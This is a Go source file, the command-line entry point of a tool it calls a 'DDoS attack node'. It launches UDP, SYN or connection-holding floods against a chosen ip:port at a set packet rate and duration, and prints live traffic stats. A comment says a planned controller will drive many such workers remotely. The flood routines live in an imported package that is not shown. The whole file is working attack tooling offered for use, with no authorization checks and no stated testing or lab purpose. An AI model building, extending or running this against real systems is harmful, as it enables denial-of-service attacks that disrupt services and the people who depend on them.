// Command worker is the attack node: it runs a single attack against one target
// until its duration expires or it receives SIGINT/SIGTERM. Phase 1 is a manual
// CLI; the controller (Phase 4) will drive it remotely.
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"ragwar/internal/attack"
)

const version = "0.1.0"

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	switch os.Args[1] {
	case "attack":
		cmdAttack(os.Args[2:])
	case "types":
		fmt.Println(strings.Join(attack.Names(), "\n"))
	case "version", "-v", "--version":
		fmt.Println("ragwar worker", version)
	default:
		usage()
		os.Exit(2)
	}
}

func usage() {
	fmt.Fprintln(os.Stderr, `ragwar worker — DDoS attack node

Usage:
  worker attack --target ip:port --type udp|syn|hold [flags]
  worker types
  worker version

Run 'worker attack -h' for flags.`)
}

func cmdAttack(args []string) {
	fs := flag.NewFlagSet("attack", flag.ExitOnError)
	target := fs.String("target", "", "target ip:port (required)")
	typ := fs.String("type", "udp", "attack type: "+strings.Join(attack.Names(), "|"))
	pps := fs.Uint64("pps", 50000, "target packets-per-second (flood types)")
	conns := fs.Int("conns", 1000, "connections to hold open (hold type)")
	payload := fs.Int("payload", 64, "udp payload size in bytes (max 1400)")
	duration := fs.Duration("duration", 60*time.Second, "attack duration")
	workers := fs.Int("workers", 0, "sender goroutines (0 = auto)")
	quiet := fs.Bool("quiet", false, "no live stats line")
	fs.Parse(args)

	if *target == "" {
		fs.SetOutput(os.Stderr)
		fmt.Fprintln(os.Stderr, "error: --target ip:port is required")
		os.Exit(2)
	}
	ip, port, err := attack.ParseTarget(*target)
	if err != nil {
		fatal(err)
	}
	a, err := attack.New(*typ)
	if err != nil {
		fatal(err)
	}

	ctx, stop := context.WithCancel(context.Background())
	go func() {
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
		<-sig
		stop()
	}()
	time.AfterFunc(*duration, stop)

	fmt.Printf("ragwar worker %s | type=%s target=%s:%d pps=%d conns=%d payload=%d workers=%d duration=%s\n",
		version, a.Name(), ip, port, *pps, *conns, *payload, *workers, *duration)

	started := time.Now()
	if !*quiet {
		go statsTicker(ctx, a, started, time.Second)
	}

	if err := a.Start(ctx, attack.Options{
		Target:   ip,
		Port:     port,
		PPS:      *pps,
		Conns:    *conns,
		Payload:  *payload,
		Workers:  *workers,
		Duration: *duration,
	}); err != nil {
		fatal(err)
	}

	printFinal(a, time.Since(started))
}

// statsTicker prints a one-line live measurement every tick.
func statsTicker(ctx context.Context, a attack.Attack, started time.Time, tick time.Duration) {
	var last attack.Stats
	lastAt := time.Now()
	t := time.NewTicker(tick)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			cur := a.Stats()
			elapsed := time.Since(lastAt).Seconds()
			if elapsed <= 0 {
				last = cur
				lastAt = time.Now()
				continue
			}
			dPkt := delta(cur.Packets, last.Packets)
			dByte := delta(cur.Bytes, last.Bytes)
			fmt.Printf("[%-5s] %s: pps=%s bps=%s%s\n",
				time.Since(started).Round(time.Second), a.Name(),
				human(dPkt/elapsed), humanBps(dByte*8/elapsed), holdSuffix(cur))
			last = cur
			lastAt = time.Now()
		}
	}
}

func printFinal(a attack.Attack, d time.Duration) {
	s := a.Stats()
	secs := d.Seconds()
	extra := ""
	if s.Conns != 0 || s.Opened != 0 {
		extra = fmt.Sprintf(" conns=%d opened=%d", s.Conns, s.Opened)
	}
	fmt.Printf("done in %s | %s: pkts=%d (%s pps avg) bytes=%d errs=%d%s\n",
		d.Round(time.Millisecond), a.Name(), s.Packets, human(float64(s.Packets)/secs), s.Bytes, s.Errors, extra)
}

func delta(cur, prev uint64) float64 {
	if cur >= prev {
		return float64(cur - prev)
	}
	return 0
}

func human(v float64) string {
	switch {
	case v >= 1e9:
		return fmt.Sprintf("%.1fG", v/1e9)
	case v >= 1e6:
		return fmt.Sprintf("%.1fM", v/1e6)
	case v >= 1e3:
		return fmt.Sprintf("%.1fk", v/1e3)
	default:
		return fmt.Sprintf("%.0f", v)
	}
}

func humanBps(v float64) string {
	switch {
	case v >= 1e9:
		return fmt.Sprintf("%.2fGbps", v/1e9)
	case v >= 1e6:
		return fmt.Sprintf("%.2fMbps", v/1e6)
	case v >= 1e3:
		return fmt.Sprintf("%.1fkbps", v/1e3)
	default:
		return fmt.Sprintf("%.0fbps", v)
	}
}

func holdSuffix(s attack.Stats) string {
	if s.Conns == 0 && s.Opened == 0 {
		return ""
	}
	return fmt.Sprintf(" conns=%d", s.Conns)
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}
